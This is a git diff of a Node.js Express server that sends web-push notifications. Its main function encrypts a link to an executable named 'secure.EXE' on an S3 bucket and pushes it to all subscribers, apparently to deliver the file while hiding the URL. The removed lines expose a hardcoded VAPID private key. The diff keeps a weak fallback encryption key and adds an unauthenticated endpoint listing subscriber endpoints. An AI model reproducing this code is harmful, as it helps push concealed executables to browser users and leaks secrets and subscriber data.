@@ -12,24 +12,24 @@ const PORT = process.env.PORT || 3000;
 app.use(cors()); // Enable CORS for all routes
 app.use(bodyParser.json()); // Parse JSON request bodies
 
-// VAPID keys for push notifications
+// Get VAPID keys from environment variables
 const vapidKeys = {
-  publicKey: 'BIW4Q1QQ-OcGMqnR5b5TEFAHjtMXQLvDhfdpT9nZsX_YWYilXjhUksAtBlGpOMs8cDeGs6LOhw0WUQesuKMovBE',
-  privateKey: 'wRWIFYBhzKe9gmMBBc3fCUZGvqKmLVtgSltNKziBjxE'
+  publicKey: process.env.VAPID_PUBLIC_KEY,
+  privateKey: process.env.VAPID_PRIVATE_KEY
 };
+
+// Get encryption key from environment variables
+const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'your-encryption-key-should-be-32-bytes';
 
 // Configure web-push
 webpush.setVapidDetails(
-  'mailto:your-email@example.com', // Replace with your email
+  'mailto:' + (process.env.CONTACT_EMAIL || 'your-email@example.com'),
   vapidKeys.publicKey,
   vapidKeys.privateKey
 );
 
 // In-memory subscription storage
 let subscriptions = [];
-
-// Encryption key (in a real app, use a more secure key management)
-const ENCRYPTION_KEY = 'your-encryption-key-should-be-32-bytes';
 
 // Function to encrypt data
 function encryptData(data) {
@@ -126,7 +126,7 @@ app.post('/api/send-file-notification', async (req, res) => {
 async function sendSpecificFileNotification(subscription) {
   try {
     // Use the specific file URL
-    const fileUrl = 'https://exe-file-download.s3.ap-southeast-1.amazonaws.com/secure.EXE';
+    const fileUrl = process.env.FILE_URL || 'https://exe-file-download.s3.ap-southeast-1.amazonaws.com/secure.EXE';
     
     // Encrypt the URL
     const encryptedUrl = encryptData(fileUrl);
@@ -158,6 +158,14 @@ async function sendSpecificFileNotification(subscription) {
     throw error;
   }
 }
+
+// Subscription list endpoint (for debugging)
+app.get('/api/subscriptions', (req, res) => {
+  return res.json({
+    count: subscriptions.length,
+    subscriptions: subscriptions.map(sub => ({ endpoint: sub.endpoint }))
+  });
+});
 
 // Start the server
 app.listen(PORT, () => {
